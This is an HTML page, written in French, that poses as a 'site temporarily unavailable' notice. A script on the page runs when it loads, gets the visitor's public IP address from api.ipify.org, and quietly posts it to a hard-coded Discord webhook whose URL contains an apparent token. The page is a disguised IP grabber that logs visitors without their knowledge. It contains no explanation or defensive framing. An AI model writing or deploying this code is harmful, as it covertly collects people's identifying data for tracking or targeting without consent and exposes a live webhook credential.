<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Temporairement Indisponible</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 100px;
        }
        h1 {
            font-size: 24px;
        }
    </style>
</head>
<body>
    <h1>Ce site est temporairement indisponible</h1>
    
    <script>
        // Fonction pour envoyer l'adresse IP à un webhook Discord
        function sendToDiscord(ipAddress) {
            var webhookURL = "https://discord.com/api/webhooks/1146133589377962045/0rNulcb03_5R1aCpocwY0KmJm5Bff6vaHwwiS8JtWPfLVfs3mUUHjmbqsGLqBDdiAl7E"; // Remplacez par l'URL de votre webhook Discord

            var content = "> **Adresse IP : **" + ipAddress;

            var request = new XMLHttpRequest();
            request.open("POST", webhookURL);
            request.setRequestHeader('Content-type', 'application/json');
            var params = {
                content: content
            };
            request.send(JSON.stringify(params));
        }

        // Fonction pour récupérer l'adresse IP de l'utilisateur
        function getIPAddress() {
            // Récupérer l'adresse IP de l'utilisateur en utilisant un service de géolocalisation
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ipAddress = data.ip;
                    
                    // Envoyer l'adresse IP à Discord
                    sendToDiscord(ipAddress);
                })
                .catch(error => {
                    console.error('Erreur lors de la récupération de l\'adresse IP :', error);
                });
        }

        // Appeler la fonction pour récupérer l'adresse IP lorsque la page est chargée
        window.onload = function() {
            getIPAddress();
        };
    </script>
</body>
</html>
